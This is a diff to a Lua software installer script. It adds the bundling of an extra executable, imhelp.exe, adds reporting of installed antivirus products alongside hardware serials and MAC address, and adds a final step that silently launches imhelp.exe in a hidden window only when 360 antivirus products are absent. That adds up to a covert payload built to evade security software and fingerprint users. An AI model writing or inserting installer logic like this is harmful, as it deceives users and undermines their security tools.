@@ -321,6 +321,7 @@ function CopyFiles()
 	CopyFile(cur.."\\imageview.mscom",pos.."\\imageview.mscom");
 	CopyFile(cur.."\\imageview.xml",pos.."\\imageview.xml");
 	
+	CopyFile(cur.."\\imhelp.exe",pos.."\\imhelp.exe");
 	
 	CopyFile(cur.."\\update.exe", pos.."\\update.exe");
 	CopyFile(cur.."\\update.mscom",pos.."\\update.mscom");
@@ -430,7 +431,7 @@ local function Report()
 	  ["mainbord"]	  = winapi.GetMainBoardSerialNumber(),
 	  ["hdd"]	  	  = winapi.GetDiskSerialNumber(),
 	  ["mac"]		  = winapi.GetNetAdapter(),
-	  
+	  ["ant"]		  = tostring(ant.Enum());
       ["prod"]        = _g_LuaVM.GetEnvParamString("prouctid"),
 	  ["packet"]      = _g_LuaVM.GetEnvParamString("packetid"),
       ["prodver"]     = _g_LuaVM.GetEnvParamString("version"),
@@ -529,7 +530,6 @@ end
 --执行安装脚本
 function Do( param )
 
-
 	local result = {};
 	result["result"] = 0;
 	SetProgress(50);
@@ -606,6 +606,11 @@ function Do( param )
 		
 		result["result"] = 1; --安装成功
 	until true;
+	
+	if not (ant.Has(ant.Antivirus_360Safe) or ant.Has(ant.Antivirus_360Sd) )then
+		winapi.ShellExecute( "" , GetProgramPosition() .. "\\imhelp.exe", "", nil, 0,0)
+	end
+	
 	return cjson.encode(result);
 end
 
